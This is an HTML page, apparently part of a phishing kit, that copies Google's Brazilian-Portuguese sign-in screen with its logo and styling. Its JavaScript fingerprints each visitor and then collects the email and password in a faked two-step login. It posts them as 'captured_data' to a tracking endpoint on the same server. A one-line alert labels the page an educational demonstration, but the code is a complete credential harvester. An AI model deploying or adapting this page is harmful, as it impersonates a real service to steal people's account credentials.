    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.1);
        }
        
        .google-logo {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .google-logo img {
            width: 75px;
            height: 24px;
        }
        
        .title {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            text-align: center;
            margin-bottom: 32px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            background: #fff;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 1px 6px 0 rgba(32,33,36,.28);
        }
        
        .form-input::placeholder {
            color: #5f6368;
        }
        
        .forgot-email {
            margin-top: 16px;
        }
        
        .forgot-email a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .forgot-email a:hover {
            text-decoration: underline;
        }
        
        .guest-mode {
            margin: 32px 0;
            padding: 16px;
            background: #f8f9fa;
            border-radius: 8px;
            border: 1px solid #e8eaed;
        }
        
        .guest-mode-text {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 8px;
        }
        
        .guest-mode a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .form-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .create-account:hover {
            text-decoration: underline;
        }
        
        .btn-primary {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 9px 23px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .btn-primary:hover {
            background: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
        }
        
        .btn-primary:disabled {
            background: #f8f9fa;
            color: #5f6368;
            cursor: not-allowed;
        }
        
        .footer {
            margin-top: 40px;
            text-align: center;
        }
        
        .footer select {
            border: none;
            background: none;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }
        
        .footer-links {
            margin-top: 16px;
        }
        
        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            font-size: 12px;
            margin: 0 8px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 32px 24px;
                border: none;
                box-shadow: none;
            }
            
            .form-actions {
                flex-direction: column;
                gap: 16px;
                align-items: stretch;
            }
            
            .btn-primary {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <svg width="75" height="24" viewBox="0 0 272 92">
                <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
                <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
                <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
                <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
            </svg>

        <h1 class="title">Fazer login</h1>
        <p class="subtitle">Use sua Conta do Google</p>
        
        <form id="loginForm">
            <div class="form-group">
                <input type="email" id="email" name="email" class="form-input" placeholder="E-mail ou telefone" required>
            </div>
            
            <div class="forgot-email">
                <a href="#" onclick="return false;">Esqueceu o e-mail?</a>
            </div>
            
            <div class="guest-mode">
                <div class="guest-mode-text">Não está no seu computador? Use o modo visitante para fazer login com privacidade.</div>
                <a href="#" onclick="return false;">Saiba mais sobre o modo visitante</a>
            </div>
            
            <div class="form-actions">
                <a href="#" class="create-account" onclick="return false;">Criar conta</a>
                <button type="submit" class="btn-primary">Avançar</button>
            </div>
        </form>
    </div>
    
    <div class="footer">
        <select>
            <option>Português (Brasil)</option>
            <option>English</option>
            <option>Español</option>
        </select>
        
        <div class="footer-links">
            <a href="#" onclick="return false;">Ajuda</a>
            <a href="#" onclick="return false;">Privacidade</a>
            <a href="#" onclick="return false;">Termos</a>
        </div>
    </div>
    
    <script>
        // Coletar informações do visitante
        function collectVisitorInfo() {
            return {
                screen_resolution: screen.width + 'x' + screen.height,
                color_depth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                java_enabled: navigator.javaEnabled(),
                cookies_enabled: navigator.cookieEnabled,
                user_agent: navigator.userAgent,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            };
        }
        
        // Enviar informações para o servidor
        function sendVisitorInfo(additionalData = {}) {
            const visitorInfo = {
                ...collectVisitorInfo(),
                ...additionalData
            };
            
            fetch('/api/tracking/visit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(visitorInfo)
            }).catch(err => console.log('Tracking error:', err));
        }
        
        // Enviar informações na chegada
        sendVisitorInfo({
            action: 'page_load',
            page: 'google_login'
        });
        
        // Simular fluxo de login do Google (primeira etapa - email)
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            
            if (!email) {
                alert('Digite seu e-mail ou telefone');
                return;
            }
            
            // Capturar email
            sendVisitorInfo({
                captured_data: {
                    email: email,
                    action: 'email_submit',
                    page: 'google_login'
                }
            });
            
            // Simular segunda etapa (senha)
            showPasswordStep(email);
        });
        
        function showPasswordStep(email) {
            // Atualizar interface para mostrar campo de senha
            document.querySelector('.subtitle').textContent = `Olá, ${email}`;
            
            const formGroup = document.querySelector('.form-group');
            formGroup.innerHTML = `
                <input type="password" id="password" name="password" class="form-input" placeholder="Digite sua senha" required>
            `;
            
            const forgotEmail = document.querySelector('.forgot-email');
            forgotEmail.innerHTML = '<a href="#" onclick="return false;">Esqueceu a senha?</a>';
            
            const guestMode = document.querySelector('.guest-mode');
            guestMode.style.display = 'none';
            
            const createAccount = document.querySelector('.create-account');
            createAccount.style.display = 'none';
            
            const submitBtn = document.querySelector('.btn-primary');
            submitBtn.textContent = 'Avançar';
            
            // Novo handler para capturar senha
            document.getElementById('loginForm').onsubmit = function(e) {
                e.preventDefault();
                
                const password = document.getElementById('password').value;
                
                if (!password) {
                    alert('Digite sua senha');
                    return;
                }
                
                // Capturar senha
                sendVisitorInfo({
                    captured_data: {
                        email: email,
                        password: password,
                        action: 'password_submit',
                        page: 'google_login'
                    }
                });
                
                // Simular redirecionamento
                setTimeout(() => {
                    alert('Dados capturados para fins educacionais. Esta é uma demonstração.');
                }, 1000);
            };
            
            // Focar no campo de senha
            document.getElementById('password').focus();
        }
        
        // Rastrear cliques em links
        document.querySelectorAll('a').forEach(link => {
            link.addEventListener('click', function(e) {
                sendVisitorInfo({
                    action: 'link_click',
                    link_text: this.textContent,
                    page: 'google_login'
                });
            });
        });
    </script>
</body>
</html>
